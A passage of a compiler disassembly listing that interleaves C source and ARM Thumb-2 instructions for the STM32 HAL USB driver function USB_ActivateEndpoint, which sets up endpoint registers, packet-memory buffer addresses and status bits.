  HAL_StatusTypeDef ret = HAL_OK;
 800611a:	2300      	movs	r3, #0
 800611c:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8006120:	687a      	ldr	r2, [r7, #4]
 8006122:	683b      	ldr	r3, [r7, #0]
 8006124:	781b      	ldrb	r3, [r3, #0]
 8006126:	009b      	lsls	r3, r3, #2
 8006128:	4413      	add	r3, r2
 800612a:	881b      	ldrh	r3, [r3, #0]
 800612c:	b29b      	uxth	r3, r3
 800612e:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8006132:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006136:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 800613a:	683b      	ldr	r3, [r7, #0]
 800613c:	78db      	ldrb	r3, [r3, #3]
 800613e:	2b03      	cmp	r3, #3
 8006140:	d81f      	bhi.n	8006182 <USB_ActivateEndpoint+0x72>
 8006142:	a201      	add	r2, pc, #4	; (adr r2, 8006148 <USB_ActivateEndpoint+0x38>)
 8006144:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8006148:	08006159 	.word	0x08006159
 800614c:	08006175 	.word	0x08006175
 8006150:	0800618b 	.word	0x0800618b
 8006154:	08006167 	.word	0x08006167
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8006158:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 800615c:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8006160:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8006164:	e012      	b.n	800618c <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8006166:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 800616a:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 800616e:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8006172:	e00b      	b.n	800618c <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8006174:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8006178:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800617c:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8006180:	e004      	b.n	800618c <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8006182:	2301      	movs	r3, #1
 8006184:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8006188:	e000      	b.n	800618c <USB_ActivateEndpoint+0x7c>
      break;
 800618a:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 800618c:	687a      	ldr	r2, [r7, #4]
 800618e:	683b      	ldr	r3, [r7, #0]
 8006190:	781b      	ldrb	r3, [r3, #0]
 8006192:	009b      	lsls	r3, r3, #2
 8006194:	441a      	add	r2, r3
 8006196:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 800619a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800619e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061a2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80061a6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061aa:	b29b      	uxth	r3, r3
 80061ac:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 80061ae:	687a      	ldr	r2, [r7, #4]
 80061b0:	683b      	ldr	r3, [r7, #0]
 80061b2:	781b      	ldrb	r3, [r3, #0]
 80061b4:	009b      	lsls	r3, r3, #2
 80061b6:	4413      	add	r3, r2
 80061b8:	881b      	ldrh	r3, [r3, #0]
 80061ba:	b29b      	uxth	r3, r3
 80061bc:	b21b      	sxth	r3, r3
 80061be:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061c2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061c6:	b21a      	sxth	r2, r3
 80061c8:	683b      	ldr	r3, [r7, #0]
 80061ca:	781b      	ldrb	r3, [r3, #0]
 80061cc:	b21b      	sxth	r3, r3
 80061ce:	4313      	orrs	r3, r2
 80061d0:	b21b      	sxth	r3, r3
 80061d2:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 80061d6:	687a      	ldr	r2, [r7, #4]
 80061d8:	683b      	ldr	r3, [r7, #0]
 80061da:	781b      	ldrb	r3, [r3, #0]
 80061dc:	009b      	lsls	r3, r3, #2
 80061de:	441a      	add	r2, r3
 80061e0:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 80061e4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061e8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061ec:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80061f0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061f4:	b29b      	uxth	r3, r3
 80061f6:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 80061f8:	683b      	ldr	r3, [r7, #0]
 80061fa:	7b1b      	ldrb	r3, [r3, #12]
 80061fc:	2b00      	cmp	r3, #0
 80061fe:	f040 8178 	bne.w	80064f2 <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8006202:	683b      	ldr	r3, [r7, #0]
 8006204:	785b      	ldrb	r3, [r3, #1]
 8006206:	2b00      	cmp	r3, #0
 8006208:	f000 8084 	beq.w	8006314 <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 800620c:	687b      	ldr	r3, [r7, #4]
 800620e:	61bb      	str	r3, [r7, #24]
 8006210:	687b      	ldr	r3, [r7, #4]
 8006212:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006216:	b29b      	uxth	r3, r3
 8006218:	461a      	mov	r2, r3
 800621a:	69bb      	ldr	r3, [r7, #24]
 800621c:	4413      	add	r3, r2
 800621e:	61bb      	str	r3, [r7, #24]
 8006220:	683b      	ldr	r3, [r7, #0]
 8006222:	781b      	ldrb	r3, [r3, #0]
 8006224:	00da      	lsls	r2, r3, #3
 8006226:	69bb      	ldr	r3, [r7, #24]
 8006228:	4413      	add	r3, r2
 800622a:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800622e:	617b      	str	r3, [r7, #20]
 8006230:	683b      	ldr	r3, [r7, #0]
 8006232:	88db      	ldrh	r3, [r3, #6]
 8006234:	085b      	lsrs	r3, r3, #1
 8006236:	b29b      	uxth	r3, r3
 8006238:	005b      	lsls	r3, r3, #1
 800623a:	b29a      	uxth	r2, r3
 800623c:	697b      	ldr	r3, [r7, #20]
 800623e:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006240:	687a      	ldr	r2, [r7, #4]
 8006242:	683b      	ldr	r3, [r7, #0]
 8006244:	781b      	ldrb	r3, [r3, #0]
 8006246:	009b      	lsls	r3, r3, #2
 8006248:	4413      	add	r3, r2
 800624a:	881b      	ldrh	r3, [r3, #0]
 800624c:	827b      	strh	r3, [r7, #18]
 800624e:	8a7b      	ldrh	r3, [r7, #18]
 8006250:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006254:	2b00      	cmp	r3, #0
 8006256:	d01b      	beq.n	8006290 <USB_ActivateEndpoint+0x180>
 8006258:	687a      	ldr	r2, [r7, #4]
 800625a:	683b      	ldr	r3, [r7, #0]
 800625c:	781b      	ldrb	r3, [r3, #0]
 800625e:	009b      	lsls	r3, r3, #2
 8006260:	4413      	add	r3, r2
 8006262:	881b      	ldrh	r3, [r3, #0]
 8006264:	b29b      	uxth	r3, r3
 8006266:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800626a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800626e:	823b      	strh	r3, [r7, #16]
 8006270:	687a      	ldr	r2, [r7, #4]
 8006272:	683b      	ldr	r3, [r7, #0]
 8006274:	781b      	ldrb	r3, [r3, #0]
 8006276:	009b      	lsls	r3, r3, #2
 8006278:	441a      	add	r2, r3
 800627a:	8a3b      	ldrh	r3, [r7, #16]
 800627c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006280:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006284:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006288:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800628c:	b29b      	uxth	r3, r3
 800628e:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006290:	683b      	ldr	r3, [r7, #0]
 8006292:	78db      	ldrb	r3, [r3, #3]
 8006294:	2b01      	cmp	r3, #1
 8006296:	d020      	beq.n	80062da <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006298:	687a      	ldr	r2, [r7, #4]
 800629a:	683b      	ldr	r3, [r7, #0]
 800629c:	781b      	ldrb	r3, [r3, #0]
 800629e:	009b      	lsls	r3, r3, #2
 80062a0:	4413      	add	r3, r2
 80062a2:	881b      	ldrh	r3, [r3, #0]
 80062a4:	b29b      	uxth	r3, r3
 80062a6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062aa:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80062ae:	81bb      	strh	r3, [r7, #12]
 80062b0:	89bb      	ldrh	r3, [r7, #12]
 80062b2:	f083 0320 	eor.w	r3, r3, #32
 80062b6:	81bb      	strh	r3, [r7, #12]
 80062b8:	687a      	ldr	r2, [r7, #4]
 80062ba:	683b      	ldr	r3, [r7, #0]
 80062bc:	781b      	ldrb	r3, [r3, #0]
 80062be:	009b      	lsls	r3, r3, #2
 80062c0:	441a      	add	r2, r3
 80062c2:	89bb      	ldrh	r3, [r7, #12]
 80062c4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062c8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062cc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062d0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062d4:	b29b      	uxth	r3, r3
 80062d6:	8013      	strh	r3, [r2, #0]
 80062d8:	e2d5      	b.n	8006886 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80062da:	687a      	ldr	r2, [r7, #4]
 80062dc:	683b      	ldr	r3, [r7, #0]
 80062de:	781b      	ldrb	r3, [r3, #0]
 80062e0:	009b      	lsls	r3, r3, #2
 80062e2:	4413      	add	r3, r2
 80062e4:	881b      	ldrh	r3, [r3, #0]
 80062e6:	b29b      	uxth	r3, r3
 80062e8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062ec:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80062f0:	81fb      	strh	r3, [r7, #14]
 80062f2:	687a      	ldr	r2, [r7, #4]
 80062f4:	683b      	ldr	r3, [r7, #0]
 80062f6:	781b      	ldrb	r3, [r3, #0]
 80062f8:	009b      	lsls	r3, r3, #2
 80062fa:	441a      	add	r2, r3
 80062fc:	89fb      	ldrh	r3, [r7, #14]
 80062fe:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006302:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006306:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800630a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800630e:	b29b      	uxth	r3, r3
 8006310:	8013      	strh	r3, [r2, #0]
 8006312:	e2b8      	b.n	8006886 <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006314:	687b      	ldr	r3, [r7, #4]
 8006316:	633b      	str	r3, [r7, #48]	; 0x30
 8006318:	687b      	ldr	r3, [r7, #4]
 800631a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800631e:	b29b      	uxth	r3, r3
 8006320:	461a      	mov	r2, r3
 8006322:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006324:	4413      	add	r3, r2
 8006326:	633b      	str	r3, [r7, #48]	; 0x30
 8006328:	683b      	ldr	r3, [r7, #0]
 800632a:	781b      	ldrb	r3, [r3, #0]
 800632c:	00da      	lsls	r2, r3, #3
 800632e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006330:	4413      	add	r3, r2
 8006332:	f203 4304 	addw	r3, r3, #1028	; 0x404
 8006336:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006338:	683b      	ldr	r3, [r7, #0]
 800633a:	88db      	ldrh	r3, [r3, #6]
 800633c:	085b      	lsrs	r3, r3, #1
 800633e:	b29b      	uxth	r3, r3
 8006340:	005b      	lsls	r3, r3, #1
 8006342:	b29a      	uxth	r2, r3
 8006344:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006346:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 8006348:	687b      	ldr	r3, [r7, #4]
 800634a:	62bb      	str	r3, [r7, #40]	; 0x28
 800634c:	687b      	ldr	r3, [r7, #4]
 800634e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006352:	b29b      	uxth	r3, r3
 8006354:	461a      	mov	r2, r3
 8006356:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006358:	4413      	add	r3, r2
 800635a:	62bb      	str	r3, [r7, #40]	; 0x28
 800635c:	683b      	ldr	r3, [r7, #0]
 800635e:	781b      	ldrb	r3, [r3, #0]
 8006360:	00da      	lsls	r2, r3, #3
 8006362:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006364:	4413      	add	r3, r2
 8006366:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800636a:	627b      	str	r3, [r7, #36]	; 0x24
 800636c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800636e:	881b      	ldrh	r3, [r3, #0]
 8006370:	b29b      	uxth	r3, r3
 8006372:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006376:	b29a      	uxth	r2, r3
 8006378:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800637a:	801a      	strh	r2, [r3, #0]
 800637c:	683b      	ldr	r3, [r7, #0]
 800637e:	691b      	ldr	r3, [r3, #16]
 8006380:	2b3e      	cmp	r3, #62	; 0x3e
 8006382:	d91d      	bls.n	80063c0 <USB_ActivateEndpoint+0x2b0>
 8006384:	683b      	ldr	r3, [r7, #0]
 8006386:	691b      	ldr	r3, [r3, #16]
 8006388:	095b      	lsrs	r3, r3, #5
 800638a:	66bb      	str	r3, [r7, #104]	; 0x68
 800638c:	683b      	ldr	r3, [r7, #0]
 800638e:	691b      	ldr	r3, [r3, #16]
 8006390:	f003 031f 	and.w	r3, r3, #31
 8006394:	2b00      	cmp	r3, #0
 8006396:	d102      	bne.n	800639e <USB_ActivateEndpoint+0x28e>
 8006398:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800639a:	3b01      	subs	r3, #1
 800639c:	66bb      	str	r3, [r7, #104]	; 0x68
 800639e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063a0:	881b      	ldrh	r3, [r3, #0]
 80063a2:	b29a      	uxth	r2, r3
 80063a4:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80063a6:	b29b      	uxth	r3, r3
 80063a8:	029b      	lsls	r3, r3, #10
 80063aa:	b29b      	uxth	r3, r3
 80063ac:	4313      	orrs	r3, r2
 80063ae:	b29b      	uxth	r3, r3
 80063b0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80063b4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80063b8:	b29a      	uxth	r2, r3
 80063ba:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063bc:	801a      	strh	r2, [r3, #0]
 80063be:	e026      	b.n	800640e <USB_ActivateEndpoint+0x2fe>
 80063c0:	683b      	ldr	r3, [r7, #0]
 80063c2:	691b      	ldr	r3, [r3, #16]
 80063c4:	2b00      	cmp	r3, #0
 80063c6:	d10a      	bne.n	80063de <USB_ActivateEndpoint+0x2ce>
 80063c8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063ca:	881b      	ldrh	r3, [r3, #0]
 80063cc:	b29b      	uxth	r3, r3
 80063ce:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80063d2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80063d6:	b29a      	uxth	r2, r3
 80063d8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063da:	801a      	strh	r2, [r3, #0]
 80063dc:	e017      	b.n	800640e <USB_ActivateEndpoint+0x2fe>
 80063de:	683b      	ldr	r3, [r7, #0]
 80063e0:	691b      	ldr	r3, [r3, #16]
 80063e2:	085b      	lsrs	r3, r3, #1
 80063e4:	66bb      	str	r3, [r7, #104]	; 0x68
 80063e6:	683b      	ldr	r3, [r7, #0]
 80063e8:	691b      	ldr	r3, [r3, #16]
 80063ea:	f003 0301 	and.w	r3, r3, #1
 80063ee:	2b00      	cmp	r3, #0
 80063f0:	d002      	beq.n	80063f8 <USB_ActivateEndpoint+0x2e8>
 80063f2:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80063f4:	3301      	adds	r3, #1
 80063f6:	66bb      	str	r3, [r7, #104]	; 0x68
 80063f8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80063fa:	881b      	ldrh	r3, [r3, #0]
 80063fc:	b29a      	uxth	r2, r3
 80063fe:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006400:	b29b      	uxth	r3, r3
 8006402:	029b      	lsls	r3, r3, #10
 8006404:	b29b      	uxth	r3, r3
 8006406:	4313      	orrs	r3, r2
 8006408:	b29a      	uxth	r2, r3
 800640a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800640c:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800640e:	687a      	ldr	r2, [r7, #4]
 8006410:	683b      	ldr	r3, [r7, #0]
 8006412:	781b      	ldrb	r3, [r3, #0]
 8006414:	009b      	lsls	r3, r3, #2
 8006416:	4413      	add	r3, r2
 8006418:	881b      	ldrh	r3, [r3, #0]
 800641a:	847b      	strh	r3, [r7, #34]	; 0x22
 800641c:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 800641e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006422:	2b00      	cmp	r3, #0
 8006424:	d01b      	beq.n	800645e <USB_ActivateEndpoint+0x34e>
 8006426:	687a      	ldr	r2, [r7, #4]
 8006428:	683b      	ldr	r3, [r7, #0]
 800642a:	781b      	ldrb	r3, [r3, #0]
 800642c:	009b      	lsls	r3, r3, #2
 800642e:	4413      	add	r3, r2
 8006430:	881b      	ldrh	r3, [r3, #0]
 8006432:	b29b      	uxth	r3, r3
 8006434:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006438:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800643c:	843b      	strh	r3, [r7, #32]
 800643e:	687a      	ldr	r2, [r7, #4]
 8006440:	683b      	ldr	r3, [r7, #0]
 8006442:	781b      	ldrb	r3, [r3, #0]
 8006444:	009b      	lsls	r3, r3, #2
 8006446:	441a      	add	r2, r3
 8006448:	8c3b      	ldrh	r3, [r7, #32]
 800644a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800644e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006452:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006456:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800645a:	b29b      	uxth	r3, r3
 800645c:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 800645e:	683b      	ldr	r3, [r7, #0]
 8006460:	781b      	ldrb	r3, [r3, #0]
 8006462:	2b00      	cmp	r3, #0
 8006464:	d124      	bne.n	80064b0 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8006466:	687a      	ldr	r2, [r7, #4]
 8006468:	683b      	ldr	r3, [r7, #0]
 800646a:	781b      	ldrb	r3, [r3, #0]
 800646c:	009b      	lsls	r3, r3, #2
 800646e:	4413      	add	r3, r2
 8006470:	881b      	ldrh	r3, [r3, #0]
 8006472:	b29b      	uxth	r3, r3
 8006474:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006478:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800647c:	83bb      	strh	r3, [r7, #28]
 800647e:	8bbb      	ldrh	r3, [r7, #28]
 8006480:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006484:	83bb      	strh	r3, [r7, #28]
 8006486:	8bbb      	ldrh	r3, [r7, #28]
 8006488:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800648c:	83bb      	strh	r3, [r7, #28]
 800648e:	687a      	ldr	r2, [r7, #4]
 8006490:	683b      	ldr	r3, [r7, #0]
 8006492:	781b      	ldrb	r3, [r3, #0]
 8006494:	009b      	lsls	r3, r3, #2
 8006496:	441a      	add	r2, r3
 8006498:	8bbb      	ldrh	r3, [r7, #28]
 800649a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800649e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064a2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064a6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064aa:	b29b      	uxth	r3, r3
 80064ac:	8013      	strh	r3, [r2, #0]
 80064ae:	e1ea      	b.n	8006886 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 80064b0:	687a      	ldr	r2, [r7, #4]
 80064b2:	683b      	ldr	r3, [r7, #0]
 80064b4:	781b      	ldrb	r3, [r3, #0]
 80064b6:	009b      	lsls	r3, r3, #2
 80064b8:	4413      	add	r3, r2
 80064ba:	881b      	ldrh	r3, [r3, #0]
 80064bc:	b29b      	uxth	r3, r3
 80064be:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80064c2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064c6:	83fb      	strh	r3, [r7, #30]
 80064c8:	8bfb      	ldrh	r3, [r7, #30]
 80064ca:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80064ce:	83fb      	strh	r3, [r7, #30]
 80064d0:	687a      	ldr	r2, [r7, #4]
 80064d2:	683b      	ldr	r3, [r7, #0]
 80064d4:	781b      	ldrb	r3, [r3, #0]
 80064d6:	009b      	lsls	r3, r3, #2
 80064d8:	441a      	add	r2, r3
 80064da:	8bfb      	ldrh	r3, [r7, #30]
 80064dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064e4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064ec:	b29b      	uxth	r3, r3
 80064ee:	8013      	strh	r3, [r2, #0]
 80064f0:	e1c9      	b.n	8006886 <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 80064f2:	683b      	ldr	r3, [r7, #0]
 80064f4:	78db      	ldrb	r3, [r3, #3]
 80064f6:	2b02      	cmp	r3, #2
 80064f8:	d11e      	bne.n	8006538 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 80064fa:	687a      	ldr	r2, [r7, #4]
 80064fc:	683b      	ldr	r3, [r7, #0]
 80064fe:	781b      	ldrb	r3, [r3, #0]
 8006500:	009b      	lsls	r3, r3, #2
 8006502:	4413      	add	r3, r2
 8006504:	881b      	ldrh	r3, [r3, #0]
 8006506:	b29b      	uxth	r3, r3
 8006508:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800650c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006510:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8006514:	687a      	ldr	r2, [r7, #4]
 8006516:	683b      	ldr	r3, [r7, #0]
 8006518:	781b      	ldrb	r3, [r3, #0]
 800651a:	009b      	lsls	r3, r3, #2
 800651c:	441a      	add	r2, r3
 800651e:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8006522:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006526:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800652a:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 800652e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006532:	b29b      	uxth	r3, r3
 8006534:	8013      	strh	r3, [r2, #0]
 8006536:	e01d      	b.n	8006574 <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 8006538:	687a      	ldr	r2, [r7, #4]
 800653a:	683b      	ldr	r3, [r7, #0]
 800653c:	781b      	ldrb	r3, [r3, #0]
 800653e:	009b      	lsls	r3, r3, #2
 8006540:	4413      	add	r3, r2
 8006542:	881b      	ldrh	r3, [r3, #0]
 8006544:	b29b      	uxth	r3, r3
 8006546:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800654a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800654e:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 8006552:	687a      	ldr	r2, [r7, #4]
 8006554:	683b      	ldr	r3, [r7, #0]
 8006556:	781b      	ldrb	r3, [r3, #0]
 8006558:	009b      	lsls	r3, r3, #2
 800655a:	441a      	add	r2, r3
 800655c:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 8006560:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006564:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006568:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800656c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006570:	b29b      	uxth	r3, r3
 8006572:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 8006574:	687b      	ldr	r3, [r7, #4]
 8006576:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006578:	687b      	ldr	r3, [r7, #4]
 800657a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800657e:	b29b      	uxth	r3, r3
 8006580:	461a      	mov	r2, r3
 8006582:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006584:	4413      	add	r3, r2
 8006586:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006588:	683b      	ldr	r3, [r7, #0]
 800658a:	781b      	ldrb	r3, [r3, #0]
 800658c:	00da      	lsls	r2, r3, #3
 800658e:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006590:	4413      	add	r3, r2
 8006592:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006596:	65bb      	str	r3, [r7, #88]	; 0x58
 8006598:	683b      	ldr	r3, [r7, #0]
 800659a:	891b      	ldrh	r3, [r3, #8]
 800659c:	085b      	lsrs	r3, r3, #1
 800659e:	b29b      	uxth	r3, r3
 80065a0:	005b      	lsls	r3, r3, #1
 80065a2:	b29a      	uxth	r2, r3
 80065a4:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80065a6:	801a      	strh	r2, [r3, #0]
 80065a8:	687b      	ldr	r3, [r7, #4]
 80065aa:	657b      	str	r3, [r7, #84]	; 0x54
 80065ac:	687b      	ldr	r3, [r7, #4]
 80065ae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80065b2:	b29b      	uxth	r3, r3
 80065b4:	461a      	mov	r2, r3
 80065b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80065b8:	4413      	add	r3, r2
 80065ba:	657b      	str	r3, [r7, #84]	; 0x54
 80065bc:	683b      	ldr	r3, [r7, #0]
 80065be:	781b      	ldrb	r3, [r3, #0]
 80065c0:	00da      	lsls	r2, r3, #3
 80065c2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80065c4:	4413      	add	r3, r2
 80065c6:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80065ca:	653b      	str	r3, [r7, #80]	; 0x50
 80065cc:	683b      	ldr	r3, [r7, #0]
 80065ce:	895b      	ldrh	r3, [r3, #10]
 80065d0:	085b      	lsrs	r3, r3, #1
 80065d2:	b29b      	uxth	r3, r3
 80065d4:	005b      	lsls	r3, r3, #1
 80065d6:	b29a      	uxth	r2, r3
